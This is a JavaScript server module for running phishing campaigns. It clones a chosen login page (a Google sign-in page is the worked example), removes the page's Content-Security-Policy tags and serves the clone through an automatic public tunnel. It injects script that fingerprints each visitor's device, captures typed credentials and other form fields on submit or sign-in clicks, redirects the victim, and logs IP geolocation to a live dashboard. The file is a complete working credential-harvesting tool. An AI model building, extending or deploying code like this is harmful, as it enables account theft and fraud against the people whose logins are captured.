import { randomBytes } from 'crypto'

// ── In-memory state ───────────────────────────────────────────────────────────

const campaigns    = new Map()   // id     → Campaign
const captures     = new Map()   // id     → Capture[]
const slugMap      = new Map()   // slug   → campaignId
const sseListeners = new Set()

// ── Auto tunnel (localtunnel) ─────────────────────────────────────────────────

let tunnelUrl    = ''
let tunnelStatus = 'starting'  // 'starting' | 'connected' | 'error' | 'closed'
let publicIp     = ''

async function fetchPublicIp() {
  try {
    const r = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(5000) })
    const { ip } = await r.json()
    publicIp = ip || ''
  } catch { publicIp = '' }
}

async function startTunnel() {
  try {
    await fetchPublicIp()
    // Dynamic import — localtunnel is CJS and may not be present on first run
    const { default: localtunnel } = await import('localtunnel')
    const lt = await localtunnel({ port: 3001 })
    tunnelUrl    = lt.url
    tunnelStatus = 'connected'
    broadcast('tunnel', { url: tunnelUrl, status: 'connected', publicIp })

    lt.on('close', () => {
      tunnelUrl    = ''
      tunnelStatus = 'closed'
      broadcast('tunnel', { url: '', status: 'closed' })
    })
    lt.on('error', () => {
      tunnelStatus = 'error'
      broadcast('tunnel', { url: '', status: 'error' })
    })
  } catch {
    tunnelStatus = 'error'
    broadcast('tunnel', { url: '', status: 'error' })
  }
}

// Start 2 s after module loads — server is guaranteed to be listening by then
setTimeout(startTunnel, 2000)

function genId(len = 4) {
  return randomBytes(len).toString('hex')
}

// ── Slug generation ───────────────────────────────────────────────────────────
// Turns https://accounts.google.com/signin → accounts.google.com/signin
// so the shared link looks like: http://localhost:3001/accounts.google.com/signin

function generateSlug(targetUrl) {
  try {
    const u    = new URL(targetUrl)
    const path = u.pathname === '/' ? '' : u.pathname.replace(/\/+$/, '')
    const base = (u.hostname + path).replace(/[^\w.\-/]/g, '').slice(0, 80)
    if (!slugMap.has(base)) return base
    // Collision — append a short random tag
    for (let i = 0; i < 20; i++) {
      const c = `${base.slice(0, 72)}-${genId(2)}`
      if (!slugMap.has(c)) return c
    }
    return `${base.slice(0, 64)}-${genId()}`
  } catch {
    return genId()
  }
}

// ── User-Agent parser ─────────────────────────────────────────────────────────

function parseUA(ua = '') {
  const os =
    /Windows NT 10/.test(ua)              ? 'Windows 10/11' :
    /Windows NT 6\.3/.test(ua)            ? 'Windows 8.1' :
    /Windows NT 6\.1/.test(ua)            ? 'Windows 7' :
    /Windows/.test(ua)                    ? 'Windows' :
    /iPhone OS ([\d_]+)/.test(ua)         ? `iOS ${ua.match(/iPhone OS ([\d_]+)/)[1].replace(/_/g, '.')}` :
    /iPad.*OS ([\d_]+)/.test(ua)          ? `iPadOS ${ua.match(/iPad.*OS ([\d_]+)/)[1].replace(/_/g, '.')}` :
    /Android ([\d.]+)/.test(ua)           ? `Android ${ua.match(/Android ([\d.]+)/)[1]}` :
    /Mac OS X ([\d_]+)/.test(ua)          ? `macOS ${ua.match(/Mac OS X ([\d_]+)/)[1].replace(/_/g, '.')}` :
    /CrOS/.test(ua)                       ? 'ChromeOS' :
    /Linux/.test(ua)                      ? 'Linux' : 'Unknown OS'

  const browser =
    /Edg\/([\d.]+)/.test(ua)              ? `Edge ${ua.match(/Edg\/([\d.]+)/)[1].split('.')[0]}` :
    /OPR\/([\d.]+)/.test(ua)             ? `Opera ${ua.match(/OPR\/([\d.]+)/)[1].split('.')[0]}` :
    /SamsungBrowser\/([\d.]+)/.test(ua)   ? `Samsung ${ua.match(/SamsungBrowser\/([\d.]+)/)[1].split('.')[0]}` :
    /Chrome\/([\d.]+)/.test(ua)           ? `Chrome ${ua.match(/Chrome\/([\d.]+)/)[1].split('.')[0]}` :
    /Firefox\/([\d.]+)/.test(ua)          ? `Firefox ${ua.match(/Firefox\/([\d.]+)/)[1].split('.')[0]}` :
    /Version\/([\d.]+).*Safari/.test(ua)  ? `Safari ${ua.match(/Version\/([\d.]+)/)[1].split('.')[0]}` :
    /Chromium\/([\d.]+)/.test(ua)         ? `Chromium ${ua.match(/Chromium\/([\d.]+)/)[1].split('.')[0]}` :
    'Unknown'

  const device = /Mobi|Android|iPhone|iPad|tablet/i.test(ua) ? 'Mobile' : 'Desktop'
  return { os, browser, device }
}

// ── IP geolocation ────────────────────────────────────────────────────────────

const GEO_CACHE = new Map()

function isPrivateIP(ip) {
  return (
    !ip ||
    ip === '127.0.0.1' ||
    ip === '::1' ||
    ip.startsWith('192.168.') ||
    ip.startsWith('10.') ||
    /^172\.(1[6-9]|2\d|3[01])\./.test(ip) ||
    ip.startsWith('::ffff:127.')
  )
}

function getFlagEmoji(cc = '') {
  if (cc.length !== 2) return '🌐'
  return String.fromCodePoint(...cc.toUpperCase().split('').map(c => 0x1F1E6 - 65 + c.charCodeAt(0)))
}

async function geoLookup(ip) {
  if (isPrivateIP(ip)) return { country: 'Local Network', city: 'localhost', region: '', isp: 'loopback', flag: '🏠', local: true }
  if (GEO_CACHE.has(ip)) return GEO_CACHE.get(ip)
  try {
    const r = await fetch(
      `http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp,org`,
      { signal: AbortSignal.timeout(4000) }
    )
    const j = await r.json()
    if (j.status === 'success') {
      const geo = { country: j.country || '', city: j.city || '', region: j.regionName || '', isp: j.isp || j.org || '', flag: getFlagEmoji(j.countryCode), local: false }
      GEO_CACHE.set(ip, geo)
      return geo
    }
  } catch { /* timeout or network error */ }
  return { country: 'Unknown', city: '', region: '', isp: '', flag: '🌐', local: false }
}

// ── SSE broadcast ─────────────────────────────────────────────────────────────

function broadcast(event, data) {
  const msg = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`
  sseListeners.forEach(fn => fn(msg))
}

// ── URL rewriting ─────────────────────────────────────────────────────────────

function rewriteUrls(html, baseUrl) {
  let origin
  try { origin = new URL(baseUrl).origin } catch { return html }

  // Root-relative href/src/action attributes
  html = html.replace(
    /(\s(?:href|src|action|data-src|data-href|poster))="(\/(?:[^"]*)?)"(\s|>)/g,
    (_, attr, path, end) => `${attr}="${origin}${path}"${end}`
  )
  // srcset
  html = html.replace(/srcset="([^"]+)"/g, (_, srcset) => {
    const rw = srcset.split(',').map(part => {
      const t  = part.trim()
      const sp = t.lastIndexOf(' ')
      const url = sp > 0 ? t.slice(0, sp) : t
      const desc = sp > 0 ? t.slice(sp) : ''
      return url.startsWith('/') ? `${origin}${url}${desc}` : t
    }).join(', ')
    return `srcset="${rw}"`
  })
  // CSS url()
  html = html
    .replace(/url\('(\/[^']+)'\)/g,  (_, p) => `url('${origin}${p}')`)
    .replace(/url\("(\/[^"]+)"\)/g,  (_, p) => `url("${origin}${p}")`)
    .replace(/url\((\/[^)"\s']+)\)/g, (_, p) => `url(${origin}${p})`)
  return html
}

// ── Beacon builder ────────────────────────────────────────────────────────────
// Minified inline JS injected into the cloned page.
// Captures: visit telemetry on load, credentials on form submit AND on
// button/submit-click (catches React/Vue synthetic forms).

function buildBeacon(campaignId, mode, redirectUrl) {
  const cap   = `/api/phishing/capture/${campaignId}`   // path only — host resolved at runtime
  const creds = mode === 'credentials'
  const redir = (creds && redirectUrl?.trim()) ? JSON.stringify(redirectUrl.trim()) : 'null'

  /* eslint-disable */
  return `<script>(function(){
var _u=location.origin+'${cap}',_r=${redir},_sent=false;
function _post(p,cb){
  var b=JSON.stringify(p);
  try{
    var blob=new Blob([b],{type:'application/json'});
    if(navigator.sendBeacon&&navigator.sendBeacon(_u,blob)){if(cb)cb();return;}
  }catch(e){}
  fetch(_u,{method:'POST',headers:{'Content-Type':'application/json'},body:b,keepalive:true})
    .then(function(){if(cb)cb();}).catch(function(){});
}
// ── Immediate visit ping ──────────────────────────────────────────────────────
_post({
  type:'visit',
  url:location.href,
  screen:screen.width+'x'+screen.height,
  depth:screen.colorDepth,
  tz:typeof Intl!=='undefined'?Intl.DateTimeFormat().resolvedOptions().timeZone:'',
  lang:navigator.language||'',
  platform:navigator.platform||'',
  vendor:navigator.vendor||'',
  cpu:navigator.hardwareConcurrency||0,
  mem:navigator.deviceMemory||0,
  online:navigator.onLine,
  ref:document.referrer||''
});
${creds ? `
// ── Credential harvesting ─────────────────────────────────────────────────────
function _fields(){
  var o={};
  document.querySelectorAll('input[type=email],input[type=text],input[type=tel],input[type=password],input[name],select,textarea').forEach(function(el){
    if(el.type==='hidden'||el.type==='submit'||el.type==='button'||el.type==='reset'||el.type==='checkbox'||el.type==='radio')return;
    var k=el.name||el.id||el.getAttribute('autocomplete')||el.type||('f'+Math.random());
    if(el.value)o[k]=el.value;
  });
  return o;
}
function _harvest(fields){
  if(!Object.keys(fields).length)return;
  _post({type:'credentials',fields:fields},function(){
    if(_r){setTimeout(function(){try{window.location.href=_r;}catch(e){}},300);}
  });
}
// Native form submit
document.addEventListener('submit',function(e){
  _harvest(_fields());
},true);
// JS-framework buttons (React, Vue, Angular etc.)
document.addEventListener('click',function(e){
  var el=e.target;
  for(var i=0;i<6&&el&&el!==document.body;i++,el=el.parentElement){
    var t=(el.type||'').toLowerCase();
    var tag=(el.tagName||'').toUpperCase();
    if(t==='submit'||(tag==='BUTTON'&&t!=='button'&&t!=='')||
       (tag==='BUTTON'&&/sign.?in|log.?in|submit|continue|next|verify/i.test(el.textContent||''))||
       (tag==='A'&&/sign.?in|log.?in/i.test(el.textContent||''))){
      _harvest(_fields());
      break;
    }
  }
},true);
` : ''}
})();</script>`
}

// ── Site cloner ───────────────────────────────────────────────────────────────

async function cloneSite(targetUrl) {
  const ctrl  = new AbortController()
  const timer = setTimeout(() => ctrl.abort(), 20000)
  try {
    const resp = await fetch(targetUrl, {
      headers: {
        'User-Agent':      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept':          'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'identity',
        'Cache-Control':   'no-cache',
        'DNT':             '1',
      },
      signal:   ctrl.signal,
      redirect: 'follow',
    })
    clearTimeout(timer)

    const ct = resp.headers.get('content-type') || ''
    if (!resp.ok) throw new Error(`HTTP ${resp.status} ${resp.statusText}`)
    if (!ct.includes('text/html') && !ct.includes('application/xhtml')) {
      throw new Error(`Target returned non-HTML content: ${ct.split(';')[0]}`)
    }

    return { html: await resp.text(), finalUrl: resp.url }
  } catch (err) {
    clearTimeout(timer)
    if (err.name === 'AbortError') throw new Error('Cloning timed out after 20 s — try a simpler page')
    throw err
  }
}

// ── Route registration ────────────────────────────────────────────────────────
// IMPORTANT: call this AFTER all other route registrations in index.js so the
// catch-all wildcard at the bottom doesn't swallow unrelated paths.

export function registerPhishingRoutes(app, requireApiKey = (_r, _s, n) => n()) {

  // ── Create campaign ─────────────────────────────────────────────────────────
  app.post('/api/phishing/campaigns', requireApiKey, async (req, res) => {
    const { name, targetUrl, mode = 'visit', redirectUrl = '' } = req.body || {}
    if (!name?.trim() || !targetUrl?.trim())
      return res.status(400).json({ error: 'name and targetUrl are required' })
    if (campaigns.size >= 25)
      return res.status(400).json({ error: 'Campaign limit (25) reached — delete some to continue' })

    let url = targetUrl.trim()
    if (!/^https?:\/\//i.test(url)) url = 'https://' + url
    try { new URL(url) } catch { return res.status(400).json({ error: 'Invalid URL' }) }

    try {
      const { html: raw, finalUrl } = await cloneSite(url)
      const id   = genId()
      const slug = generateSlug(url)

      const beacon = buildBeacon(id, mode, redirectUrl)

      // Rewrite root-relative resource paths, strip meta CSP, inject base + beacon
      let html = rewriteUrls(raw, finalUrl)
      html = html.replace(/<meta[^>]+http-equiv=["']Content-Security-Policy["'][^>]*\/?>/gi, '')
      const base = `<base href="${finalUrl}">`
      if (/<head[^>]*>/i.test(html)) {
        html = html.replace(/(<head[^>]*>)/i, `$1${base}${beacon}`)
      } else {
        html = beacon + base + html
      }

      const campaign = {
        id, slug, name: name.trim(), targetUrl: url, finalUrl,
        mode, redirectUrl: redirectUrl.trim(),
        created: Date.now(), captureCount: 0,
        clonedHtml: html,
      }
      campaigns.set(id, campaign)
      captures.set(id, [])
      slugMap.set(slug, id)

      const { clonedHtml: _, ...safe } = campaign
      res.json(safe)
    } catch (err) {
      res.status(500).json({ error: err instanceof Error ? err.message : String(err) })
    }
  })

  // ── List campaigns ──────────────────────────────────────────────────────────
  app.get('/api/phishing/campaigns', requireApiKey, (_req, res) => {
    const list = [...campaigns.values()]
      .map(({ clonedHtml: _, ...c }) => c)
      .sort((a, b) => b.created - a.created)
    res.json(list)
  })

  // ── Delete campaign ─────────────────────────────────────────────────────────
  app.delete('/api/phishing/campaigns/:id', requireApiKey, (req, res) => {
    const c = campaigns.get(req.params.id)
    if (!c) return res.status(404).json({ error: 'Campaign not found' })
    slugMap.delete(c.slug)
    campaigns.delete(req.params.id)
    captures.delete(req.params.id)
    broadcast('campaign_deleted', { id: req.params.id })
    res.json({ ok: true })
  })

  // ── Get captures for a campaign ─────────────────────────────────────────────
  app.get('/api/phishing/captures/:campaignId', requireApiKey, (req, res) => {
    const list = captures.get(req.params.campaignId)
    if (!list) return res.status(404).json({ error: 'Campaign not found' })
    res.json(list)
  })

  // ── Record a capture (beacon POST) ──────────────────────────────────────────
  app.post('/api/phishing/capture/:campaignId', async (req, res) => {
    res.status(204).end()   // respond immediately, enrich async

    const campaign = campaigns.get(req.params.campaignId)
    if (!campaign) return

    const rawIp = (req.headers['x-forwarded-for'] || req.socket?.remoteAddress || req.ip || '')
      .split(',')[0].trim().replace(/^::ffff:/, '')
    const ua   = req.headers['user-agent'] || ''
    const body = req.body || {}

    const { os, browser, device } = parseUA(ua)
    const geo = await geoLookup(rawIp)

    const capture = {
      id:           genId(),
      campaignId:   req.params.campaignId,
      campaignName: campaign.name,
      type:         body.type === 'credentials' ? 'credentials' : 'visit',
      ip:           rawIp,
      geo, ua, os, browser, device,
      screen:   body.screen   || '',
      depth:    body.depth    || 0,
      tz:       body.tz       || '',
      lang:     body.lang     || '',
      platform: body.platform || '',
      vendor:   body.vendor   || '',
      cpu:      body.cpu      || 0,
      mem:      body.mem      || 0,
      online:   body.online   ?? null,
      fields:   body.fields   || null,
      ref:      body.ref      || '',
      pageUrl:  body.url      || '',
      timestamp: new Date().toISOString(),
    }

    const list = captures.get(req.params.campaignId)
    if (list) list.unshift(capture)
    campaign.captureCount++
    broadcast('capture', capture)
  })

  // ── Tunnel status ───────────────────────────────────────────────────────────
  app.get('/api/phishing/tunnel', requireApiKey, (_req, res) => {
    res.json({ url: tunnelUrl, status: tunnelStatus, publicIp })
  })


  // ── SSE stream ──────────────────────────────────────────────────────────────
  app.get('/api/phishing/stream', requireApiKey, (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream')
    res.setHeader('Cache-Control', 'no-cache')
    res.setHeader('Connection', 'keep-alive')
    res.flushHeaders()
    const fn = msg => { if (!res.writableEnded) res.write(msg) }
    sseListeners.add(fn)
    req.on('close', () => sseListeners.delete(fn))
  })

  // ── Serve cloned page by direct ID (internal) ───────────────────────────────
  app.get('/p/:id', (req, res) => {
    const c = campaigns.get(req.params.id)
    if (!c) return res.status(404).send(_notFound())
    res.setHeader('Content-Type', 'text/html; charset=utf-8')
    res.send(c.clonedHtml)
  })

  // ── Catch-all: serve cloned page by slug ─────────────────────────────────────
  // e.g. GET /accounts.google.com/signin
  // MUST be registered last — index.js calls registerPhishingRoutes() after all
  // other route definitions so this wildcard cannot shadow /api/* routes.
  app.use((req, res, next) => {
    if (req.method !== 'GET' && req.method !== 'HEAD') return next()
    const slug = req.path.slice(1)   // strip leading /
    const id   = slugMap.get(slug)
    if (!id) return next()
    const c = campaigns.get(id)
    if (!c) return next()
    res.setHeader('Content-Type', 'text/html; charset=utf-8')
    res.send(c.clonedHtml)
  })
}

function _notFound() {
  return '<!DOCTYPE html><html><head><title>Not Found</title></head><body style="background:#0a0f1a;color:#475569;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0"><p>Page not found or campaign expired.</p></body></html>'
}
